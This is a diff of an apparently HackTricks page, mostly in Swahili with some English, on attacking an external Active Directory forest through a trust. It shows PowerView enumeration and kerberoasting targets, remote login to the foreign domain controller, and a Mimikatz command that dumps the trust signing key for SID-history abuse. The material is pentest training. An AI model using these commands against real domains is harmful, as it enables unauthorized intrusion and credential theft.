@@ -1,4 +1,4 @@
-# External Forest Domain - OneWay (Inbound) au bidirectional
+# External Forest Domain - OneWay (Inbound) or bidirectional
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -6,8 +6,8 @@ Katika hali hii, kikoa cha nje kinakuamini (au vyote vinajiamini), hivyo unaweza
 
 ## Enumeration
 
-Kwanza kabisa, unahitaji **kuhesabu** **kuamini**:
-```powershell
+Kwanza kabisa, unahitaji **kuhesabu** **imani**:
+```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
@@ -56,14 +56,14 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-Katika orodha iliyopita iligundulika kwamba mtumiaji **`crossuser`** yuko ndani ya kundi la **`External Admins`** ambalo lina **upatikanaji wa Admin** ndani ya **DC ya eneo la nje**.
+In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.
 
 ## Upatikanaji wa Awali
 
-Ikiwa hujaweza kupata **upatikanaji maalum** wa mtumiaji wako katika eneo lingine, bado unaweza kurudi kwenye Mbinu za AD na kujaribu **privesc kutoka kwa mtumiaji asiye na mamlaka** (mambo kama kerberoasting kwa mfano):
+Ikiwa hujaweza kupata ufikiaji wowote wa **maalum** wa mtumiaji wako katika eneo lingine, bado unaweza kurudi kwenye Mbinu za AD na kujaribu **privesc kutoka kwa mtumiaji asiye na mamlaka** (mambo kama kerberoasting kwa mfano):
 
-Unaweza kutumia **Powerview functions** ili **kuorodhesha** **eneo lingine** kwa kutumia param ya `-Domain` kama ilivyo:
-```powershell
+You can use **Powerview functions** to **enumerate** the **other domain** using the `-Domain` param like in:
+```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
 {{#ref}}
@@ -75,7 +75,7 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ### Kuingia
 
 Kwa kutumia njia ya kawaida na akidi za watumiaji ambao wana ufikiaji wa eneo la nje unapaswa kuwa na uwezo wa kufikia:
-```powershell
+```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### SID History Abuse
@@ -87,7 +87,7 @@ Ikiwa mtumiaji amehamishwa **kutoka msitu mmoja hadi mwingine** na **SID Filteri
 > [!WARNING]
 > Kama ukumbusho, unaweza kupata funguo ya kusaini na
 >
-> ```powershell
+> ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
